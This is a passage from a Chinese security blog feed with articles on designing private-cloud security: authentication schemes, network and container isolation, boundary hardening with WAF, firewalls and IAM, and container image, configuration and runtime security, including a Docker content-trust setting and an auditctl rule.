<p>另外，对于我们通常讲的硬编码问题，云管平台也一般会配上KMS密钥管理功能，通过线上线下分离，也能缓释内部Git库对第三方开放的风险。</p>

<h4 id="应用安全"><em>应用安全</em></h4>

<p>在针对应用的保护上，从粗粒度来看，我们可以通过添WAF（主机层面和代理层面）、添加网页防窜改（植入文件监控）、添加反爬机制（做好验证和混淆策略，然后接入风控）。</p>

<p>同时，我们在考虑外部风险点时，防DDOS和CC也会是个重点治理方案，这个在前面的《私有云安全-边界安全设计实践》已经提到过。</p>

<p>最后，我们需要特别关注下，云管平台自带的（或者另行搭建）API安全网关，是否能完美支持我们私有云服务间接口的协议。</p>

<h4 id="态势感知sa"><em>态势感知SA</em></h4>

<p>安全态势感知产品的类别也很多，比如SIEM就是软件和服务的组合，通过对各类告警信息的整合，提升私有云整体审计溯源、应急响应的能。</p>

<p>而SOC其实跟前者有些类似，但更趋向于以资产为核心，以安全事件管理为关键流程，采用安全域划分的思想，建立一套实时的资产风险模型进行集中式管理。</p>

<p>至于Gartner之后力推的SOAR，个人觉得比较难去适配各家的产品。
上云的系统在针对各类标准不同的API进行自动化编排时，会对研发成本消耗加剧，应当有待观察后续的发展情况。</p>

<h3 id="鉴权防护">鉴权防护</h3>

<p>在私有云的接口调用和角色操作行为方面，有很多地方涉及到细粒度鉴权。</p>

<p>我们可能不一定有机会，在代码层面去附加设计鉴权策略，但是可以借助云管平台和PaaS资源，根据现有的基础做一些配置优化。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-17/1605596905800-%E9%89%B4%E6%9D%83%E4%BD%93%E7%B3%BB.png" alt="鉴权体系" /></p>

<h4 id="中间件鉴权"><em>中间件鉴权</em></h4>

<p>在私有云架构里使用中间件时，由于采用的大规模集群管理，不可能单独做配置，所以一般会有两种基础鉴权方式：</p>

<ul>
  <li>
    <p>第一，我们可以使用Security插件，这类是附带的中间件管理机制，但缺点是无法统一做管控溯源。</p>
  </li>
  <li>
    <p>第二，我们可以在Nginx层面做反向代理，然后在此层面提高吞吐量，通过第三方接口回调或者代理配置进行认证。</p>
  </li>
</ul>

<h4 id="api鉴权"><em>API鉴权</em></h4>

<p>至于API鉴权，在可信域范围之内，我们可以通过注册信息，直接进行通信交互。
否则的话，我们需要借助签名信息，与KMS密钥管理平台协作，完成交互认证闭环。</p>

<h4 id="cdn鉴权"><em>CDN鉴权</em></h4>

<p>由于私有云上存储的文件，其访问和外发都是比较敏感的。</p>

<p>因此，除了要对文件本身做好加密，我们还需要在访问控制做好鉴权。</p>

<p>在访问URL时，我们可以通过带上私钥和时间戳的加密组合，结合身份来验证是否盗链访问，同时这样也能限制文件访问的过期时间。</p>

<p>此外，我们可以通过IP白名单的方式做辅助验证，系统发现更改来源IP（或者直接进行内网IP绑定）后，会直接拒绝访问。</p>

<h4 id="微服务鉴权"><em>微服务鉴权</em></h4>

<p>这里讨论的其实不属于资源层面的，而是属于架构层面的认证鉴权。</p>

<p>微服务鉴权目前的做法，使用全局Token+API网关鉴权会多一些。</p>

<p>在这种形式下微服务是透明化的，通过网关时会把原始的用户令牌，转换为内部会话ID令牌，单方面注销相对来说也精准一些。</p>

<h4 id="元素基准鉴权"><em>元素基准鉴权</em></h4>

<p>元素基准鉴权的问题，在前面的系列文章《私有云安全-边界安全设计实践》也简单提到过。</p>

<p>我们通过对角色、资源、服务等多个维度，构建对应的复杂关系网络，其中再以某个元素为基准点，进行XABC类型的鉴权，实际应用可以参考IAM访问控制模型。</p>

<h4 id="多因素鉴权">多因素鉴权</h4>

<p>我们统一认证入口处，为了鉴别登入人的身份，通常会采用多因素认证。
比如短信+密码，或者令牌+密码，有时候还可能加上硬件KEY、指纹、虹膜识别等等技术手段。</p>

<p>在这里需要注意的是，由于私有云环境是相对固定的运维人员做操作，也希望减少对外的交互，最好采用在断网情况下也能进行认证的方式。</p>

<h3 id="人为监督">人为监督</h3>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-17/1605596995987-%E4%BA%BA%E4%B8%BA%E7%9B%91%E7%9D%A3.png" alt="人为监督" /></p>

<p>在私有云复杂环境下，如果出现问题，我们需要对资产进行细分，建立相应资产责任人制度。</p>

<ul>
  <li>落地一级责任人自查，针对资源设置直接责任人，方便出问题时进行溯源和告警。</li>
  <li>实行多人Backup机制，针对资源进行归类划分，一个资源群有2-3人递归负责。</li>
  <li>推广支撑部门互相监督，在业务中如果出现了异常调用的流量，支撑部门需要对可能出现问题的一方进行监督提醒。</li>
  <li>制定分级上报流程，在上报期间，如果出现延期响应和业务方推诿后，可以分期逐级再向上推送。</li>
</ul>

<h3 id="分级隔离">分级隔离</h3>

<p>在针对私有云内的安全隔离上，主要分多个层面逐级进行隔离，建立纵深防御的隔离体系。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-17/1605597244651-%E5%8C%BA%E5%9F%9F%E9%9A%94%E7%A6%BB.png" alt="分级隔离" /></p>

<h4 id="acl隔离">ACL隔离</h4>

<p>ACL一般是在防火墙或者交换机上实现的，是基于IP地址的控制策略。</p>

<p>在此基础上，我们通过IP地址段和端口列表的形式进行控制，但其控制粒度相对较粗，这种适合对应用层访问控制进行补充。</p>

<h4 id="vpc区域隔离">VPC区域隔离</h4>

<p>专有网络VPC属于第二层的隔离，可以为每个用户创建多个子网。</p>

<p>VPC代表了不同的租户，以它为限制区域隔离出了租户，每个租户的子网之间也是可以继续隔离的。</p>

<p>部分云厂商由于拓展偏好，借鉴了AWS的Vxlan协议，对每个VPC网络进行隔离。</p>

<p>但其实传统的Vlan隔离出来的数量，也是够用的。</p>

<p>另外，在每个云租户内部，如果隔离要求比较严格，其实也可以借用VPC进行安全隔离。</p>

<h4 id="安全组隔离">安全组隔离</h4>

<p>在云租户内部的VPC内，如果还想尝试更细粒度的划分，可以尝试安全组形式的隔离。</p>

<p>安全组用于设置多台云服务器的网络访问控制，是重要的网络安全隔离手段，用于在云端划分安全域。</p>

<p>安全组是一个逻辑上的划分，这个分组由同一个地域内具有相同安全保护需求，并相互信任的实例组成。</p>

<p>它在不同的云厂商实现中，叫法和实现方式可能也有差异，比如将VPC内的隔离成为Subnet（子网），意思应该与安全组一样。</p>

<h4 id="容器层隔离">容器层隔离</h4>

<p>这个概念是用虚拟化技术来作为容器（确切地说是 Kubernetes Pod）的沙箱，目前主流的开源安全容器项目是Kata、Gvisor，各大互联网厂商应用的也比较多。</p>

<p>虽然作为安全容器项目，Kata和Gvisor目前在业务稳定性和兼容性上，比起Docker还有待优化，但毕竟是未来替代发展的大趋势。</p>

<p>它们能提供虚拟机级别的隔离性，这个安全级别是在过去数年以来的云服务中，是被广泛接受的。</p>

<p>新型的安全容器不再共享内核，而是利用Hypervisor等技术进行加固和隔离。</p>

<p>它们对Linux依赖都是比较固定，而且能在每个阶段做到安全审计，降低被攻破的风险，是我们对于容器研究里程碑的较大的突破。</p>

<h3 id="参考文档">参考文档</h3>

<p><a href="https://www.cnblogs.com/ExMan/p/12125640.html">微服务认证鉴权的四种方案</a></p>

<p><a href="https://developer.aliyun.com/ask/214321?spm=a2c6h.13524658">CDN 如何实现鉴权配置</a></p>

<p><a href="https://cloud.tencent.com/developer/article/1628386">关于网络安全域隔离问题的研究与思考</a></p>

<p><a href="https://developer.aliyun.com/article/738934">安全容器：开启云原生沙箱技术的未来</a></p>

<p><a href="https://www.freebuf.com/articles/others-articles/228615.html">云原生之容器安全实践</a></p>

<p><a href="https://baijiahao.baidu.com/s?id=1630404422879648523&amp;wfr=spider&amp;for=pc">全景解析5种云安全技术方案</a></p>
]]></content>
      <categories>
        
          <category> cloud </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[私有云安全-边界安全设计实践]]></title>
      <url>/cloud/2021/01/15/boundary-sec-design/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>对于私有云环境的安全建设工作中，需要做的事务繁杂而冗长。但我们在梳理要点后，会发现非传统边界的加固工作，也是我们应该重点关注的。</strong></span>
</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-26/1606397128210-%E8%BE%B9%E7%95%8C%E5%AE%89%E5%85%A8.jpg" alt="边界安全概述" /></p>

<p>首先，我们需要关注私有云环境的<strong>访问控制</strong>问题，在实现一定程度的可信准入后，对各层次的边界进行鉴权和认证；另外，我们需要针对潜在外部的大流量，以及容器间的流量风暴，通过代理集群和容灾多活的方式，进行<strong>分流防御</strong>处理；当然，无论是IDC资源还是容器资源，我们都务必要做好<strong>主机加固</strong>的工作，阻止黑客进行权限提升和横向扩散。</p>

<h3 id="主机加固">主机加固</h3>

<h4 id="端口策略">端口策略</h4>

<p><strong>出入策略</strong></p>

<p>在对网络边界的安全进行设计时，我们需要对出入端口的访问控制策略，进行精细化的控制。</p>

<p><em>云环境边界：</em></p>

<p>对于云环境边界的宿主机和IDC来说，端口开放的越多，意味着攻击面会扩大。而它们被黑客尝试或者存在风险的可能性，也会越大。</p>

<p>所以在此逻辑基础上，这些主机需要依赖云容器管理平台和人工配置，借助类iptables的系统工具，对开放的端口实行最小化原则，同时也要对所有的端口进行严格的认证控制，保障基础的传统边界控制。</p>

<p><em>安全域隔离边界：</em></p>

<p>至于云环境网络隔离区，则相对来说没有没那么严格。在不同的服务之间，本身可能会存在流量交互，所以进出口规则会比较复杂，变动也会相对来说更多，如果同样采用最小化策略，可能会对业务带来比较多的困扰。</p>

<p>但是，对于网络隔离区的出入策略，对于端口控制，也是需要做好认证和鉴权的，这块儿的内容也需要云管平台去做统一的配置管理。</p>

<p><strong><em>流量监控</em></strong></p>

<p>对于端口出入的流量，我们除了做好异常流控，保证网络稳定以外，也需要对其中的流量进行监控检测。</p>

<p>在黑客通过手段获取了云环境内主机的临时权限后，可能会尝试横向移动或者后门反弹，抑或直接进行数据拖取。在这种情况下，对于端口流量的监控就显得尤为重要了。</p>

<p>在监控到端口流量异常后，安全运营中心（SOC）可以通过行为联动进行分析告警，及时阻断隔离可能沦陷的机器的访问控制。</p>

<h4 id="攻击阻断">攻击阻断</h4>

<p><strong><em>边界WAF</em></strong></p>

<p>在私有云环境提供对外的WEB服务时，对于外部用户可触达的范围，是需要提供WAF保护的。</p>

<p>在针对这部分内容的防御上，主要是针对传统URI进行访问核查，以及对API的访问控制。</p>

<p>其中对于接口的访问频次和流量内容，是否存在异常，都是边界WAF需要关注的。</p>

<p>这里显然不建议在安全域隔离边界进行WAF部署，我们应该专注对云环境边界的主机（如Nginx层）进行流量收口阻断控制，这样是相对合适的做法。</p>

<p><strong><em>边界防火墙</em></strong></p>

<p>对于边界防火墙的话，可以对私有云网络的内外流量进行交互限制，限制异常流量的出入。</p>

<p>就部署的优先级来看，是私有云边界优先于安全域隔离边界。</p>

<p>我们也可以在云环境边界，尝试部署硬件防火墙，再在安全域边界通过软件防火墙的形式进行补充，当然具体实施要看情况而定。</p>

<p>在实际部署的过程中，我们可能会遇到预算有限、业务复杂性较高、网络稳定性要求高等多重问题困扰。</p>

<p>所以我们需要在保障最低安全标准的情况下，对相关安全能力逐步进行建设和方案优化。</p>

<p><strong><em>HIDS</em></strong></p>

<p>在边界主机上，我们部署HIDS的同时，进行日志的留存分析也是很有必要的。</p>

<p>在入侵事件发生的事前和事中，我们可以通过内网态势感知（日志流量的监控联动），对攻击进行拦截阻断。</p>

<p>而边界主机上的HIDS的监控告警和相关安全日志，能帮助安全运维人员更好的治病于腠理。</p>

<p>另外需要强调的一点，日志最好统一上传到日志分析中心（比如ELK或者Splunk），以免被拿到权限的黑客清除入侵痕迹。</p>

<h3 id="分流防御">分流防御</h3>

<p>对于进入私有云环境的流量，我们首先需要做好流量控制，防止内部脆弱的网络出现稳定性故障。</p>

<p><strong><em>负载均衡SLB：</em></strong></p>

<p>负载均衡（Server Load Balancer）是将访问流量根据转发策略，分发到后端多台机器的流量分发控制服务，这是在流量出入口实施分流控制的常见做法。</p>

<p>比如在云环境边界的Nginx集群接受了用户的访问请求后，经过流量控制检测，如果没有问题会继续向后分发到真实主机，经过逻辑处理后跟数据主机集群进行交互，最后把结果再反馈给Nginx集群，形成完整的访问闭环。</p>

<p>这个问题其实更偏向于运维的内容，而非安全主要关注的点。但它又在对外防御流量攻击（Dos和CC）上，会起到不可或缺的作用。</p>

<p><strong><em>CDN防护和流量清洗：</em></strong></p>

<p>CDN防护和流量清洗（类比云堤的黑洞），这些概念其实应该归类于混合云的范畴了。</p>

<p>如果想要在私有云环境里完成独立的防护和清洗，先不论实现效果的差异，我们需要注意下面几点：</p>

<ul>
  <li>
    <p>静态服务器集群：主要功能是静态资源托管，这是完成内网CDN替代的关键。不过混合云使用的CDN本身是可以隐藏真实IP的，这能在一定流量上限范围内，防止外部流量打穿从而泄露真实主机。</p>
  </li>
  <li>
    <p>高防硬件防火墙清洗：如果不能把流量导向到各大云厂商进行清洗后回流，那高标准的硬件边界防火墙是必要的。否则极端情况下，会直接导致业务瘫痪。</p>
  </li>
  <li>
    <p>高吞吐量的带宽：这也是高稳定性业务必须要具备的基础，它能支持我们在对入口流量进行清洗的同时，还能稳定的对外提供访问。</p>
  </li>
</ul>

<h3 id="访问控制">访问控制</h3>

<p>在私有云环境里的边界，通过多维度进行准入访问控制，也是我们需要重点关注的内容。</p>

<h4 id="iam认证">IAM认证</h4>

<p>IAM（身份和访问管理）通常负责用户需要访问的各种系统中的身份生命周期管理。简单来说，分为身份、认证、授权三个大模块。这个无论在边界访问控制，还是在纵深防御的建设上，我们都会重点提及。</p>

<p>在私有云边界入口，有试图对内部发起访问的行为时时，我们需要对其属性和角色进行合法性校验，再对其进行细致的访问控制。</p>

<p><strong><em>身份（身份生命周期管理）：</em></strong></p>

<p>这块儿的内容是企业关注的重点之一，在员工入职、角色变更、离职等单一流程线之外，其实也涉及到了复杂的关联变化。</p>

<p><strong><em>认证（身份认证）：</em></strong></p>

<p>这点我们可以采用多种方式进行，比如token、签名秘钥、或者多因子认证等等。</p>

<p>而针对用户身份进行鉴别准入时，我们可能会考虑到多维度的内容，比如IP、用户指纹、设备指纹等等。</p>

<p><strong><em>授权（权限分配）：</em></strong></p>

<p>这是IAM安全管控的核心，确保正确的人在正确的时间，动态地获得正确的访问权。</p>

<p>从概念上来讲，PBAC是当前和未来的IAM最佳授权方法，因为PBAC结合了RBAC和ABAC的最佳特性。</p>

<p><em>落地补充：</em></p>

<p>对于私有云落地实施来讲，部分云厂商给的采购解决方案里，管控平台统一为未来接入的系统，预留了IAM管控方案，我们可以少操一点心。</p>

<p>但如果如果在中后期独立研发、采购的系统，或者本身就是自己组建的私有云环境，则需要通过设计接口和相关改造方案，尽快接入统一的IAM体系。</p>

<p>我们在私有云网络组建前期，需要定制和遵循基础的安全原则和方针路线，这能在一定程度上，减少后期改造和维护的成本。</p>

<h4 id="api网关">API网关</h4>

<p>针对API的细粒度访问控制来讲，我们可能会借助平台，在其间扮演网关的角色进行管控，我们主要关注下面几点：</p>

<p><strong><em>API全生命周期管理：</em></strong></p>

<p>涵盖API的完整生命周期管理功能，可随时回滚指定环境到特定版本。</p>

<p><strong><em>API流量控制：</em></strong></p>

<p>细致精确的流量控制，用户可根据自身业务对API服务进行流量配置，精确到秒级请求过滤和控制，避免突发高流量，导致后端服务出现过载。</p>

<p><strong><em>API认证安全：</em></strong></p>

<p>在API访问时进行代理认证，保障不出现横向和纵向的越权访问。</p>

<p><em>落地总结：</em></p>

<p>这些工作的进行，一般是基于平台进行第三方管控的。</p>

<p>但实际情况是，我们的系统代码里可能为了调试和兼容，不用强行要求认证也能进行访问。所以针对这些情况的治理，也是我们需要特别思考的。</p>

<h4 id="可信原则">可信原则</h4>

<p>在私有云建设中，由于我们需要遵循政策，做到IaaS和PaaS层面的安全合规，实现一定程度可信链路。</p>

<p>而不是一味追求零信任，从而真实的优化我们的安全管理工作。</p>

<p><strong><em>流量可信：</em></strong></p>

<p>首先在日常的私有云管理中，每日管理员操作的时段是有限的，操作行为也是有限的，所以剩下的都是自动化运维的行为。</p>

<p>剔除这部分流量后，剩下的异常流量行为审计，可以在自动化的分析下比较明显的突显出来，最终将减少我们溯源和应急所耗费的精力。</p>

<p><strong><em>账号可信：</em></strong></p>

<p>在接入的账号里，管理级别权限的账号数量和操作行为应该做到最小化，细节操作应该更多的去依赖子账号。</p>

<p>另外，针对租户内子账号的具体角色绑定，也需要进行细致配置核查，坚持实现权限最小化，防止错误配置导致事故的发生。</p>

<p><strong><em>边界隔绝：</em></strong></p>

<p>私有云由于其合规的特殊性，一般要求不能直接接入互联网边界。在这种情况下，我们对于私有云IDC数据流量是可控的，进出的数据可以做旁路和代理前置监控。</p>

<p>另外，这种情况下一般也不能接入VPN和外部专线，即使需要实现异地多活进行容灾，可能也需要独立运维进行支持，不可一概而论。</p>

<p><strong><em>终端可信：</em></strong></p>

<p>在我们在接入平台进行运维的时候，需要尝试遵循一致性原则，通过EUC（终端用户上下文）ticket，多维度证明初始请求者（original requester）的身份。</p>

<p>我们在实践中颁发凭证时，可以尝试把设备和服务请求进行分别绑定，使得服务间授权后能完成互相信任。</p>

<p>这样一来，即使出现了事故我们需要溯源，定位也会更加精确迅速。</p>

<p><strong><em>服务可信：</em></strong></p>

<p>当不同的服务间进行RPC通信时，本身应该遵从Service Access Policy（服务访问策略），Service Mesh服务网格技术（比如Istio）能帮我们做好这点。</p>

<p>在实际应用中，即使在同一租户内的不同微服务之间，默认不应该保持信任，需要其他的安全控制：例如认证和加密。</p>

<p>同时，向微服务的转变，给我们提供了一个对传统安全模型进行重新思考的机会。</p>

<h3 id="参考文章">参考文章</h3>

<p><a href="https://help.aliyun.com/document_detail/101318.html">互联网边界防火墙
</a></p>

<p><a href="https://blog.csdn.net/linjpg/article/details/98481182">阿里云负载均衡SLB 详解</a></p>

<p><a href="https://mp.weixin.qq.com/s/64ynVhD9jnMh0LTqAuXqQA">网络安全架构 | IAM（身份访问与管理）架构的现代化
</a></p>

<p><a href="https://www.dbappsecurity.com.cn/show-43-220-1.html">某医院智慧医疗网络安全项目案例（DMZ区域建设解决方案）
</a></p>

<p><a href="http://arthurchiao.art/blog/google-beyondprod-zh/">[译] BeyondProd：云原生安全的一种新方法（Google, 2019）
</a></p>
]]></content>
      <categories>
        
          <category> cloud </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[私有云安全-容器安全设计实践]]></title>
      <url>/cloud/2020/12/08/container-sec-design/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>私有云安全由于其合规性和独立性，不同于公有云和混合云，需要单独定制落地的流程和规划，这里跟大家简单聊聊关于容器安全设计的相关问题。</strong></span>
</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-9-26/1601107557741-容器安全-0926.jpg" alt="容器安全概述" /></p>

<h3 id="容器安全综述">容器安全综述</h3>

<p>容器安全架构设计，可以在其三大关键生命周期阶段进行实施，其中包括镜像安全、配置安全、运行安全。</p>

<p><strong>镜像安全：</strong></p>

<p>在初始阶段对镜像本身做把控，从供应链进行核查，在日常会对镜像做验证和校验，最后会在构建时进行阻断或者检测。</p>

<p><strong>配置安全：</strong></p>

<p>对于构建好的初始镜像，需要遵从行CIS、NIST最佳安全实践。在构建好系统后，需要检查相应的Docker配置、Kubernetes配置、以及操作系统本身。</p>

<p><strong>运行安全：</strong></p>

<p>在容器运行的时候，我们会对里面的系统运行状态进行监控，还会对CMDB资产图谱状态进行对比核查。</p>

<h3 id="镜像安全">镜像安全</h3>

<h4 id="嵌入流程检测">嵌入流程检测</h4>

<p>这部分工作可以结合CICD流水线进行，一般有两种建议。</p>

<p><em>CI构建阻断：</em></p>

<p>日常构建新镜像时，接入配置扫描和白盒扫描流程，如果核查出错会直接阻断，这种做法稍显粗暴，而且会影响业务，但这样可以减少镜像出现风险的可能性，后续重构建的工作也会相应减少。</p>

<p><em>旁路分析：</em></p>

<p>复制需要检测的镜像，进行模拟构建，出问题直接阻断。这样的好处是不会影响业务进程，但脆弱的镜像可能会被构建到生产环境，存在潜在风险。</p>

<p>出现问题后，研发运维人员需要根据镜像标签去做追踪，剔除脆弱镜像或者排期重新构建。</p>

<p>这种一般是在构建时，不会直接阻断流程，而是旁路提供鉴定报告，后续再供给安全运维人员进行分析。</p>

<p>当然如果需要得到即时结果，则构建扫描可以提供API攻击给Docker CI平台，作为结果自动化处理的参考。</p>

<h4 id="镜像初始安全">镜像初始安全</h4>

<h5 id="镜像库内控"><em>镜像库内控</em></h5>

<p>首先，对于镜像本身，由于企业自用的镜像大部分是规范定制化的，纯私有云落地的话不建议使用公网镜像库，可以看看harbor之类的，这也是为保障供应链风险可控。</p>

<p>由于私有云合规性的特殊要求，一般是要求不能接入专线（与混合云不同），这样能在减少诸如水坑攻击，或者防止被黑客大规模挂马之类攻击误伤。</p>

<h5 id="镜像仓库核查"><em>镜像仓库核查</em></h5>

<p>对于初始镜像，需要定期核查软件镜像库，查看镜像是否被植入木马。如果私有镜像仓库由于配置不当而开启了2357端口，将会导致私有仓库暴露在公网中。</p>

<p>这样的话，攻击者可以直接访问私有仓库并篡改镜像内容，存在仓库镜像被污染的隐患。</p>

<h5 id="镜像扫描核查"><em>镜像扫描核查</em></h5>

<p>镜像核查，主要会做两方面的工作：</p>

<ul>
  <li>
    <p>第一，是进行常规漏洞检测，根据CVE漏洞库进行清单核查式扫描。</p>
  </li>
  <li>
    <p>第二，是对系统进行基线检查，把潜在的风险扼杀在摇篮里。</p>
  </li>
</ul>

<p>这部分核查结果，需要分布走进行治理，首先更新初始镜像，把相关镜像的缺陷统一修复。
然后，会根据线上业务和系统本身的稳定性和适配度，在测试环境调试回归并灰度完毕，再统一进行替换。</p>

<h5 id="镜像数字签名"><em>镜像数字签名</em></h5>

<p>Docker的内容信任（Content Trust）机制，可保护镜像在镜像仓库与用户之间传输过程中的完整性。目前。目前Docker的内容信任机制是默认关闭的，需要手动开启。</p>

<p>内容信任机制启用后，镜像发布者可对镜像进行签名，而镜像使用者可以对镜像签名进行验证。</p>

<p>镜像构建者在通过docker build命令运行Dockerfile文件前，需要通过手动或脚本方式将DOCKER_CONTENT_TRUST环境变量置为1进行启用。</p>

<p>在内容信任机制开启后，push、build、create、pull、run等命令均与内容信任机制绑定，只有通过内容信任验证的镜像才可成功运行这些操作。例如，Dockerfile中如果包含未签名的基础镜像，将无法成功通过docker  build进行镜像构建。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>（命令示例：export DOCKER_CONTENT_TRUST = 1）
</code></pre>
</div>

<h5 id="供应链核查"><em>供应链核查</em></h5>

<p>对于代码中使用的公共组件包，需要对来源进行核查。在私有云的落地实践中，最好是建立私有包的仓库，这样即使镜像被进行植入性攻击，也在可溯源和可控制的范围内。</p>

<p>顺便提一下，企业日常使用的代码编译器，也需要在企业核准控制范围内。最好通过统一采购源，在内网提供正版的下载，以及提供内网激活API等方式。</p>

<p>但是，在目前大环境下，由于版权和虚拟资产购置价格过高的问题，不少互联网大厂也很难统一解决这一点。</p>

<h3 id="配置安全">配置安全</h3>

<h4 id="内部核查">内部核查</h4>

<h5 id="dockerfile核查"><em>Dockerfile核查</em></h5>

<p>如果Dockerfile存在漏洞或被插入恶意脚本，那么生成的容器也可能产生漏洞或被恶意利用。例如，攻击者可构造特殊的Dockerfile压缩文件，在编译时触发漏洞获取执行任意代码的权限。</p>

<p>如果在Dockerfile中没有指定USER，Docker将默认以root用户的身份运行该Dockerfile创建的容器，如果该容器遭到攻击，那么宿主机的root访问权限也可能会被获取。</p>

<p>如果在Dockerfile文件中存储了固定密码等敏感信息，并对外进行发布，则可能导致数据泄露的风险。</p>

<p>如果在Dockerfile的编写中添加了不必要的应用，如SSH、Telnet等，则会产生攻击面扩大的风险。</p>

<h5 id="metadata安全监控"><em>Metadata安全监控</em></h5>

<p>本身私有云环境是相对隔离的，但如果其中的数据访问鉴权方式不当，或者意外造成了安全密钥泄露的话，黑客可以比较容易的获取到敏感元数据。</p>

<p>所以在安全配置和访问控制上，我们仍旧需要在日常做好监控工作。</p>

<h4 id="攻击面核查">攻击面核查</h4>

<h5 id="强制访问控制"><em>强制访问控制</em></h5>

<p>强制访问控制（Mandatory Access Control, MAC）是指每一个主体（包括用户和程序）和客体都拥有固定的安全标记，主体能否对客体进行相关操作，取决于主体和客体所拥有安全标记的关系。</p>

<p>在Docker容器应用环境下，可通过强制访问控制机制限制容器的访问资源。Linux内核的强制访问控制机制包括SELinux、AppArmor等。</p>

<h5 id="内容信任机制"><em>内容信任机制</em></h5>

<p>Linux内核能力表示进程所拥有的系统调用权限，决定了程序的系统调用能力。</p>

<p>因此，不当的容器能力配置可能会扩大攻击面，增加容器与宿主机面临的安全风险。</p>

<p>在执行docker run命令运行Docker容器时可根据实际需求通过–cap-add或–cap-drop配置接口对容器的能力进行增删，或者尝试通过配置文件进行统一调整。</p>

<h5 id="构建资管图谱"><em>构建资管图谱</em></h5>

<p>枚举初始镜像内的软件包、端口、服务，构建初始清单列表。</p>

<p>如果私有云安全架构体系中，本身可以考虑构建类似于CMDB资产管理的系统，也可以考虑搭配像Dependency-track等工具，核查对于第三方的依赖。</p>

<p>否则的话，可以通过灰盒扫描和流量agent方式，对资产数据库进行补充检查。</p>

<p>同时，一旦出现异常，通过自动化对比初始状态数据，我们也能较快地发现风险。</p>

<h3 id="运行安全">运行安全</h3>

<h5 id="敏感信息检查"><em>敏感信息检查</em></h5>

<p>核查运行的镜像系统的代码中，是否存在敏感信息泄露：密码、秘钥、token等。</p>

<p>这个问题比较微妙，可能更偏向普适性的安全问题，但作为系统运行时安全，还是要提一下的。</p>

<h5 id="黑盒扫描"><em>黑盒扫描</em></h5>

<p>在容器中系统的运行时，可能会无意中暴露一些攻击面，因此我们需要选择适当的扫描器进行定期核查。</p>

<p>这里简单例举几个黑盒扫描引擎：</p>

<ul>
  <li>nessus（网络主机漏洞扫描器）</li>
  <li>awvs（web爬虫扫描器）</li>
  <li>appscan（IBM重量级web扫描器）</li>
  <li>dirscan（web路径扫描器）</li>
  <li>docker-bench-security（官方基线核查脚本）</li>
  <li>anchore（针对容器Docker的CVE扫描）</li>
</ul>

<h5 id="白盒扫描"><em>白盒扫描</em></h5>

<p>白盒扫描的话，同样也可以嵌入CICD流水线进行检查，如果出现问题，对比实际情况（比如命中率）进行阻断和漏洞上报。</p>

<p>当然，如果误报率较高的话，可以仅从旁路记录，等待安全人员审核漏洞是否存在后，再督促业务方修复迭代。</p>

<p>如果扫描规则有更新，也可以日常对代码库进行扫描，匹配筛选出可能存在缺陷的分支进行告警，以便及时更新镜像系统中的代码。</p>

<p>简单例举几类白盒扫描引擎：</p>

<ul>
  <li>SonarQube（定制安全规则）</li>
  <li>BlackDuck（开源组件检查）</li>
  <li>Findsecbug（开源的findbug安全插件，可作用于编译器和平台）</li>
  <li>Coverity（可以定制安全规则）</li>
  <li>Fortify（误报较多，但覆盖面较全，pj版本多）</li>
  <li>Semmle QL（官方有分析平台lgtm.com）</li>
  <li>KunLun-M（404实验室的开源产品）</li>
</ul>

<h4 id="安全监控">安全监控</h4>

<h5 id="资产图谱核查"><em>资产图谱核查</em></h5>

<p>对于在配置阶段获取的清单图谱，需要在系统运行阶段，进行资产定期巡检对比核查。</p>

<p>如果容器中的系统，开放了异常端口和服务，或者安装了异常的软件包，应该对该镜像构建的相关容器系统，通过核实后尽快进行冻结处理。</p>

<h5 id="hids监控"><em>HIDS监控</em></h5>

<p>在容器系统运行的过程中，如果出现被入侵或者污染的情况，仅凭日常的扫描和事前事中检查，不一定能及时精确的定位溯源。</p>

<p>这时就需要对文件变更进行监控，以及对异常进程及时发现，还有记录异常行为和疑似的后门留存等等。</p>

<p>云厂商们的技术各有千秋，无论是宿主机级别，还是能植入容器的HIDS，都能一定程度上提升容器的安全兜底能力。</p>

<h5 id="容器进程安全审计"><em>容器进程安全审计</em></h5>

<p>在安全审计方面，对于运行Docker容器的宿主机而言，除需对主机Linux文件系统等进行审计外，还需对Docker守护进程的活动进行审计。</p>

<p>由于系统默认不会对Docker守护进程进行审计，需要通过主动添加审计规则或修改规则文件进行。</p>

<p>除Docker守护进程之外，还需对与Docker的运行相关的文件和目录进行审计，同时需要配置审计规则文件（/etc/audit/audit.rules）。</p>

<p>命令示例：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>auditctl -w /usr/bin/docker -k docker
</code></pre>
</div>

<h5 id="容器网络安全"><em>容器网络安全</em></h5>

<p>由于Docker容器默认的网桥模式，不会对网络流量进行控制和限制。所以为了防止网络被DoS攻击的风险，需要根据实际需求对网络流量进行相应的控制。</p>

<p><em>针对openstack的网络</em>：</p>

<p>在<strong>同一主机内相同子网中的不同容器之间</strong>，可以通过建立的虚拟化集群，通过vlan对不同租户进行子网隔离不同，基于overlay网络的容器集群，默认可以直接访问。</p>

<p>如需控制<strong>宿主机外部到内部容器应用的访问</strong>，可通过在宿主机iptables中的DOCKER-INGRESS链，手动添加ACL访问控制规则，以控制宿主机的eth0到容器的访问，或者在宿主机外部部署防火墙等方法实现。</p>

<p><em>针对k8s的网络：</em></p>

<p>策略可以应用于通过常用标签标识的pod组。然后，可以使用标签来模拟传统的分段网络，这些网络通常用于在多层应用程序中隔离层：例如，您可以通过特定的“段”标签来标识前端和后端pod。策略控制这些段之间的流量，甚至控制来自外部源的流量。</p>

<p>由于存在频繁的微服务动态变化更新，通过手动的方式配置iptables或更新防火墙是不现实的。因此，可通过微分段（Micro-Segmentation）实现面向容器云环境中的容器防火墙。</p>

<p>微分段是一种细粒度的网络分段隔离机制，与传统的以网络地址为基本单位的网络分段机制不同，微分段可以以单个容器、同网段容器、容器应用为粒度实现分段隔离，并通过容器防火墙对实现微分段间的网络访问控制。</p>

